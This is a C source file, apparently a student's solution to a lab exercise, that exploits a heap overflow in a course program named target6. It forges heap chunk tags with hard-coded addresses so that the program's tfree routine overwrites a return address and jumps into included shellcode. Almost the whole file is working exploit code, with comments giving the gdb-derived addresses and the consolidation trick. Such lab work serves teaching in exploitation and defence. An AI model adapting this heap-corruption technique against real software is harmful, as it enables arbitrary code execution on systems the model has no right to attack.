#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define BUF_SIZE 192
#define SHELL_SIZE 45
#define NOP 0x90

/*
target is to overflow the RA of foo by pointing the fake tag to the RA, modify it and points to the shellcode
rip for foo: 0x3021fea8, fake tag should link to this place

gdb, memory:
&p = 0x0104ec48
&q = 0x0104ec98
within a huge accessable memory, p is pointing to 0xec48 and q is 0xec98, based on this, shellcode should be located between these two addr
fake tag should be responded just before q and link to RA of foo so that tfree() can link to the tag in p
(chunk_tag is 8 bytes so the fake tag should be 8 bytes ahead of q)

after linking to the old RA, the tfree will turn the RA into a chunk where the right of the chunk is null and the left of the chunk is the actual return addr (to main)
have to use the right consolidation to rewrite the s.l, so have to find a way to set p free

CHUNK* will include the next 8 bytes as chunk tag starting with the addr passed in, i.e., (CHUNK*) p will make the first 8 bytes of the buf to be a chunk tag

Summary:
tfree will get a tag 8 bytes after the passed in addr. to modify the return addr i have to make sure that p->s.l is marked as free in its right addr if tfree(p)
left consolidation is always not possible so dont consider
when the return addr points to the start of p, let it jumps over the p->s.r and direct to the shellcode

*/
int main(void)
{
    char *args[3];
    char *env[1];

    args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
    env[0] = NULL;

    char buf[BUF_SIZE];
    int i;
    for (i = 0; i < BUF_SIZE; i++)
        buf[i] = NOP;

    // create a fake tag starting at p and a fake tag starting just before q
    // the "l" of p (the first 4 bytes) will be such that it skips 4 bytes (skips "r" of p)
    char p_fake_left[] = "\x03\xeb\x90\x90"; // start of p = skipping
    char p_fake_right[] = "\x01\x01\x01"; // allow right consolidation to change the RA
    char fake_left[] = "\x48\xec\x04\x01"; // &p = 0x0104ec48
    char fake_right[] = "\xa8\xfe\x21\x30"; // RA = 0x3021fea8

    for (i = 0; i < 4; i++) {
        buf[0 + i] = p_fake_left[i];
    }

    for (i = 0; i < 3; i++) {
        buf[4 + i] = p_fake_right[i];
    }

    for (i = 0; i < SHELL_SIZE; i++) {
        buf[7 + i] = shellcode[i];
    }

    for (i = 0; i < 4; i++) {
        buf[72 + i] = fake_left[i];
    }

    for (i = 0; i < 4; i++) {
        buf[76 + i] = fake_right[i];
    }

    buf[BUF_SIZE - 1] = '\0';

    args[1] = buf;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
